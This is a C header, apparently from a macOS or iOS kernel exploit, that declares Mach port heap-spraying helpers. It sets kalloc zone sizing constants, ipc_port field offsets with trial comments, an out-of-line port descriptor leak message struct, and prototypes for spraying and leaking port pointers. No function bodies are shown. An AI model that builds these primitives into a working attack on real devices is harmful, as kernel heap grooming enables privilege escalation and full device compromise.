#ifndef MACH_PORTS_H
#define MACH_PORTS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#define N_BEFORE_PORTS 0x2800
#define N_AFTER_PORTS 0x1400
#define N_SPRAY_PORTS 52000

#define SIZEOF_VM_MAP_HEADER 52 // 50-54 
#define KALLOC_4096 0x1000 - SIZEOF_VM_MAP_HEADER

// 8 * 4 B = 32 B -> Allocation in kalloc.32
#define N_PORTS_LEAK 8

#define N_OOL_PORTS_DESCRIPTOR 0x190

#define IP_CONTEXT_PORT_OFFSET 104 // 104 didnt work
#define LCK_SOMETHING_OFFSET 16 // 104 didnt work

#define MAGIC_CONSTANT 0xdeadbeef

struct ool_leak_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_leak_msg * ool_leak_msg_t;

int prepare_ports(mach_port_t *receive_port, mach_port_t *target_port, 
        mach_port_t *own_task_port, mach_port_t **before_ports,
        mach_port_t **after_ports, mach_port_t **spray_ports);
int spray_port_pointer(mach_port_t receive_port, mach_port_t target_port, mach_port_t other_port);
int spray_null_port_pointer(mach_port_t receive_port);
void destroy_ports(mach_port_t receive_port, mach_port_t *before_ports, mach_port_t *after_ports);
int spray_kalloc_4096(mach_port_t *spray_ports, mach_port_t target_port,
				    uint32_t port_offset, int *port_number);

uint32_t get_port_offset(uint32_t port_pointer);
uint32_t get_port_page(uint32_t port_pointer);

int ool_descriptor_spray(mach_port_t *spray_port, uint8_t *data, size_t data_size);

#endif /* ! MACH_PORTS_H */